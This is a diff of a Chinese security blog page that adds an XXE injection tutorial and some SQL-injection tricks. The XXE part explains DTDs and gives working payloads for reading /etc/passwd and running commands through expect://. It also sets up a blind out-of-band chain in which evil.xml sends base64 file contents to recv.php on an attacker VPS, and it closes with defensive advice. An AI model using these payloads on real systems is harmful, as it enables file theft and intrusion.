@@ -152,6 +152,124 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-xxe" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+
+
+    		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XXE（XML External Entity Injection），即XML外部实体注入。漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。</p>
+<h2 id="XML与DTD的关系"><a href="#XML与DTD的关系" class="headerlink" title="XML与DTD的关系"></a>XML与DTD的关系</h2><p>DTD（Document Type Definition）文档类型定义,一种XML约束模式语言，属于XML文件组成的一部分。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--文档声明--&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="comment">&lt;!--DTD--&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE poem [  &lt;!--定义此文档是 poem 类型的文档--&gt;</span></div><div class="line">&lt;!ELEMENT poem (author, title, content)&gt;  &lt;!--定义poem元素有四个元素--&gt;</div><div class="line">&lt;!ELEMENT author (#PCDATA)&gt;  &lt;!--定义author元素为“#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT title (#PCDATA)&gt;  &lt;!--定义title元素为“#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT content (#PCDATA)&gt;  &lt;!--定义content元素为“#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>DTD文档有三种应用形式。</p>
+<p>内部DTD文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span></div></pre></td></tr></table></figure>
+<p>外部DTD文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路径"&gt;</span></div></pre></td></tr></table></figure>
+<p>内外部DTD文档结合：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="XXE漏洞原理——XML实体"><a href="#XXE漏洞原理——XML实体" class="headerlink" title="XXE漏洞原理——XML实体"></a>XXE漏洞原理——XML实体</h2><p>实体主要分为四种:</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p><strong>注：</strong> 完整实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="external">DTD - Entities</a></p>
+<p>其实，XML可分为<strong>普通实体</strong>和<strong>参数实体</strong>。</p>
+<p>而根据实体声明方式的不同，还分为<strong>内部实体</strong>和<strong>外部实体</strong>，XXE利用的是外部实体。</p>
+<p><img src="/2018/03/04/xxe/0.png" alt=""></p>
+<h3 id="普通实体引入外部实体"><a href="#普通实体引入外部实体" class="headerlink" title="普通实体引入外部实体"></a>普通实体引入外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encodinf=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE poem [</span></div><div class="line">    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;  &lt;!--可为file、http、ftp 等等协议--&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></div><div class="line">    &amp;xxe;</div><div class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="参数实体引入外部实体"><a href="#参数实体引入外部实体" class="headerlink" title="参数实体引入外部实体"></a>参数实体引入外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encodinf=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE poem [</span></div><div class="line">    &lt;!ENTITY % a SYSTEM "http://www.test.com/outdtd.dtd"&gt;  &lt;!--可为file、http、ftp 等等协议--&gt;</div><div class="line">    %a;  &lt;!--执行outdtd.dtd的内容--&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">poem</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">&lt;!--outdtd.dtd内容--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>注：外部资源的URI主要支持file、http、https、ftp等协议，对不同的程序所支持的协议不同。</strong></p>
+<p><img src="/2018/03/04/xxe/1.png" alt=""></p>
+<h2 id="XXE漏洞类型与危害"><a href="#XXE漏洞类型与危害" class="headerlink" title="XXE漏洞类型与危害"></a>XXE漏洞类型与危害</h2><h3 id="I-任意文件读取"><a href="#I-任意文件读取" class="headerlink" title="I.任意文件读取"></a>I.任意文件读取</h3><p>通过外部实体引用，实现任意文件读取。</p>
+<h3 id="II-URL请求，SSRF"><a href="#II-URL请求，SSRF" class="headerlink" title="II.URL请求，SSRF"></a>II.URL请求，SSRF</h3><ul>
+<li>端口扫描，探测内网服务</li>
+<li>内网攻击get型payload，如st2命令执行、discuz ssrf通过redis实施getshell；指纹识别等等</li>
+<li>DoS拒绝服务：通过实体的递归调用，占用大量服务器资源。</li>
+</ul>
+<h3 id="III-远程代码执行"><a href="#III-远程代码执行" class="headerlink" title="III.远程代码执行"></a>III.远程代码执行</h3><p>在php开启<strong>expect</strong>扩展的前提下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE root [</span></div><div class="line">    &lt;!ENTITY cmd SYSTEM "expect://id"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">dir</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">file</span>&gt;</span>&amp;cmd;<span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dir</span>&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="XXE漏洞本地测试"><a href="#XXE漏洞本地测试" class="headerlink" title="XXE漏洞本地测试"></a>XXE漏洞本地测试</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>构造<code>index.html</code>、<code>func.php</code>和<code>test.txt</code>。<code>index.html</code>构造表单，并转换成XML字符串，发送到<code>func.php</code>转化成XML对象，并输出数据。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--index.html--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>xxe test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"welcome"</span> <span class="attr">name</span>=<span class="string">"information"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">span</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">span</span>&gt;</span>E-mail:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"post"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">form2XML</span>(<span class="params">obj</span>)</span>&#123;</div><div class="line">			<span class="keyword">let</span> iForm = <span class="built_in">document</span>.getElementById(obj);</div><div class="line">			<span class="keyword">let</span> tmp = <span class="string">''</span>;</div><div class="line">			<span class="comment">//获取所有type为'text'的input</span></div><div class="line">			<span class="keyword">let</span> aInput = <span class="built_in">Array</span>.from(iForm.getElementsByTagName(<span class="string">'input'</span>)).filter(<span class="function"><span class="params">x</span> =&gt;</span> x.type === <span class="string">'text'</span>);</div><div class="line">			<span class="keyword">for</span>(v <span class="keyword">of</span> aInput)&#123;</div><div class="line">				<span class="keyword">let</span> tagName = tagValue = <span class="string">''</span>;</div><div class="line">				tagName = v.name;</div><div class="line">				tagValue = v.value;</div><div class="line">				<span class="keyword">let</span> tTag = <span class="string">`&lt;<span class="subst">$&#123;tagName&#125;</span>&gt;<span class="subst">$&#123;tagValue&#125;</span>&lt;/<span class="subst">$&#123;tagName&#125;</span>&gt;`</span>;</div><div class="line">				tmp += tTag;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">let</span> outXML = <span class="string">'&lt;'</span> + iForm.name + <span class="string">'&gt;'</span> + tmp + <span class="string">'&lt;/'</span> + iForm.name + <span class="string">'&gt;'</span>;</div><div class="line">			<span class="keyword">return</span> outXML;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//发送XML请求</span></div><div class="line">		<span class="keyword">const</span> post_btn = <span class="built_in">document</span>.getElementById(<span class="string">'post'</span>);</div><div class="line">		post_btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">			$.ajax(&#123;</div><div class="line">				<span class="attr">url</span>: <span class="string">"./func.php"</span>,</div><div class="line">				<span class="attr">data</span>: form2XML(<span class="string">'welcome'</span>),</div><div class="line">				<span class="attr">type</span>: <span class="string">'POST'</span>,</div><div class="line">				<span class="attr">contentType</span>: <span class="string">"text"</span>,</div><div class="line">				<span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">					<span class="built_in">document</span>.write(data);</div><div class="line">				&#125;,</div><div class="line">				<span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">xhr, ajaxOptions, thrownError</span>)</span>&#123;</div><div class="line">					<span class="built_in">console</span>.log(xhr.status);</div><div class="line">					<span class="built_in">console</span>.log(thrownError);</div><div class="line">				&#125;</div><div class="line">			&#125;);</div><div class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">		&#125;</div><div class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!--func.php--&gt;</div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">	<span class="comment">//开启解析XML外部实体功能</span></div><div class="line">	<span class="comment">//libxml_disable_entity_loader(false); </span></div><div class="line"></div><div class="line"> 	$xml = file_get_contents(<span class="string">"php://input"</span>); </div><div class="line">  	@$res = simplexml_load_string($xml); </div><div class="line">  	<span class="keyword">echo</span> <span class="string">"name : "</span> . $res-&gt;username . <span class="string">"\n"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"email : "</span> . $res-&gt;email;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>输入数据点击提交，利用burpsuite进行抓包：</p>
+<p><img src="/2018/03/04/xxe/2.png" alt=""></p>
+<p>修改XML数据，发包，可读取到<code>test.txt</code>的数据：</p>
+<p><img src="/2018/03/04/xxe/3.png" alt=""></p>
+<h3 id="利用参数实体取得间接回显"><a href="#利用参数实体取得间接回显" class="headerlink" title="利用参数实体取得间接回显"></a>利用参数实体取得间接回显</h3><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
+<ol>
+<li>客户端发送payload1给Web服务器</li>
+<li>Web服务器向VPS获取恶意DTD，并执行文件读取payload2</li>
+<li>Web服务器带着回显结果访问VPS上特定FTP或者HTTP</li>
+<li>黑客通过VPS获得回显</li>
+</ol>
+<p>服务器中构造<code>index.php</code>、<code>xxe.xml</code>和<code>flag.txt</code>。VPS中构造<code>evil.xml</code>、<code>recv.php</code>和<code>data.txt</code>。其中<code>flag.txt</code>为要读取的数据，然后存入<code>data.txt</code>中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!--index.php--&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$testXML = file_get_contents(<span class="string">"xxe.xml"</span>);</div><div class="line">	<span class="comment">//libxml_disable_entity_loader(false);</span></div><div class="line">	$xml = simplexml_load_string($testXML);</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</div><div class="line">	print_r($xml);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--xxe.xml--&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [</span></div><div class="line">	&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"&gt;</div><div class="line">	&lt;!ENTITY % evildtd SYSTEM "http://www.ubuntu.com/evil.xml"&gt;</div><div class="line">	%evildtd;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!--evil.xml--&gt;</div><div class="line">&lt;!ENTITY % send "&lt;!ENTITY &amp;#37; data SYSTEM 'http://www.ubuntu.com/recv.php?file=%file;'&gt;"&gt;</div><div class="line">%send;</div><div class="line">%data;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!--recv.php--&gt;</div><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">file_put_contents(<span class="string">"test.txt"</span>, base64_decode($_GET[<span class="string">'file'</span>]));  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问服务器的<code>index.php</code>,服务器将去请求VPS上的<code>evil.xml</code>并执行，带上<code>flag.txt</code>经过base64加密后的内容<br>去请求VPS上的<code>recv.php</code>，于是将base64解码后的数据存入了<code>data.txt</code>。完成间接回显。</p>
+<p><strong>注：若<code>flag.txt</code>的读取不采用<code>php://filter</code>，则当文件内容包含空格换行等，将导致<code>recv.php</code>请求失败。</strong></p>
+<p><img src="/2018/03/04/xxe/4.png" alt=""></p>
+<h2 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h2><ul>
+<li>禁用外部实体</li>
+<li>过滤和验证用户提交的XML数据</li>
+<li>不允许XML中含有任何自己声明的DTD</li>
+<li>禁止外来引入，如在php中可设置<code>libxml_disable_entity_loader(true)</code></li>
+</ul>
+<h2 id="参考传送门"><a href="#参考传送门" class="headerlink" title="参考传送门"></a>参考传送门</h2><ul>
+<li><a href="https://www.ichunqiu.com/open/58939?from=hd" target="_blank" rel="external">https://www.ichunqiu.com/open/58939?from=hd</a></li>
+<li><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></li>
+<li><a href="https://mp.weixin.qq.com/s/ek2I9tshyTG0HvTAHMmdsQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/ek2I9tshyTG0HvTAHMmdsQ</a></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/03/04/xxe/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-SQLi" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -266,6 +384,13 @@
 <li><p>上一条技巧的懵逼形式：<code>select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2))</code></p>
 </li>
 </ul>
+<p><strong>Trick</strong></p>
+<p>通过<code>polygon()</code>和<code>linestring()</code>可爆出当前表名。还有<code>multipoint、multilinestring、multipolygon</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> polygon(proid);</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> linestring(proid);</div></pre></td></tr></table></figure>
+<p>通过<code>join + using</code>的方法来获取字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> A <span class="keyword">join</span> <span class="keyword">user</span> <span class="keyword">as</span> B <span class="keyword">using</span>(pro_id)) <span class="keyword">as</span> C;</div></pre></td></tr></table></figure>
+<p>通过联合查询，运用虚拟表在不出现字段名的情况下查出内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,a<span class="number">.1</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</div></pre></td></tr></table></figure>
 <h3 id="f-导入导出操作"><a href="#f-导入导出操作" class="headerlink" title="f.导入导出操作"></a>f.导入导出操作</h3><ul>
 <li>load_file导出文件：</li>
 </ul>
@@ -1056,6 +1181,10 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
               </li>
             
             <div class="clearfix"></div>
